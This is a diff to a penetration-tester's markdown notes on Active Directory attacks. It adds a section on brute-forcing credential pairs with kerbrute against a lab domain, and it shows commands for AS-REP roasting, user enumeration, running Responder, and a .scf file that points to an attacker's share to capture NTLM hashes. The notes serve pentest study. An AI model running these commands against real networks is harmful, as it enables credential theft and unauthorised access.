@@ -27,7 +27,7 @@ python3 GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile <USERLIST>
 - [Roasting AS-REPS](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
 - [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
-## Kerberoasting
+**Kerberoasting**
 
 Kerberoasting is a method for extracting service account credentials from Active Directory as a notmal user. Again, [AD Security](https://adsecurity.org/) has an insane amount of content that goes in depth to what this is, how it works, and when to use it. I won't even bother going into the detail's of the attack here, but articles from them are linked below.
 
@@ -67,6 +67,11 @@ IconFile=\\<YOUR IP>\share\test.ico
 Command=ToggleDesktop
 ```
 
+[This tool](https://github.com/xct/hashgrab) is great for making payloads to capture hashes.
+
+This attack is also very useful because It lets us relay things because it gives us a middle position between a User & a Service.
+  - [The NTLM Protocol & NTLM Relay Attacks](https://github.com/ToBeatELIT3/InfoSecNotes/blob/main/Miscellaneous/The%20NTLM%20Protocol%20%26%20NTLM%20Relay%20Attacks.pdf)
+
 2) Run [responder](https://github.com/lgandx/Responder) locally
 
 ```bash
@@ -101,3 +106,18 @@ Enumerate valid usernames using ``kerbrute``. This requires Kerberos to the open
 kerbrute userenum -d <DOMAIN> --dc <IP> <USERLIST>
 ```
 
+**Valid User Testing**
+
+Input fiie should have username:password pairs in them. 
+
+Example:
+
+```
+admin:admin
+KThompson:SecretPassw0rd
+SWall:Lol123!
+```
+
+```bash
+kerbrute bruteforce --dc 10.129.83.46 -d scrm.local pairs.txt
+```
